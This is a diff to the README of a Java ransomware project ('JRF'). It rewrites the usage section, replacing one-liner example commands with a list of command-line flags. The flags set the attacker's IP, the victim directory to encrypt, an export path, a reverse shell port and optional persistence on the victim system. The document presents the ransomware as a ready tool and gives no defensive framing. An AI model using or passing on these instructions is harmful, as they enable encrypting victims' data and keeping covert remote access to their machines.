@@ -19,12 +19,16 @@ It is a project to build a ransomware made with java. With the framwork, ransomw
     * port: any port except 5555 and 6666, since these are the ports used by KeyServer and DecryptRequestHandler
     * persistence: Decryptor tries to configure the victim system so that the attacker's access would be persistent. This may be detected as some system has permission setting blocking this utility.
 
-### One liner:
-* `java JRF <IP> <TargetPath> <revPort> <persistence> <exportPath>`
-#### Examples:
-* `java JRF 192.168.68.21 /home /home/user/Desktop`
-* `java JRF 192.168.68.21 /home 5678 /home/user/Desktop`
-* `java JRF 192.168.68.21 /home 5678 persistence /home/user/Desktop`
+### Command line arguments:
+
+```
+ -h,--IP <IP>                         Local IP address
+ -o,--Export path <Export path>       destination for export
+ -p,--PORT <PORT>                     Reverse shell port
+ -P,--Persistence                     Activate reverse shell persistence
+ -r,--Use reverse shell               Activate reverse shell
+ -t,--Target dir <Target directory>   Target directory for the ransomware
+```
 #### Note: reverse shell and persistence are optional
 
 
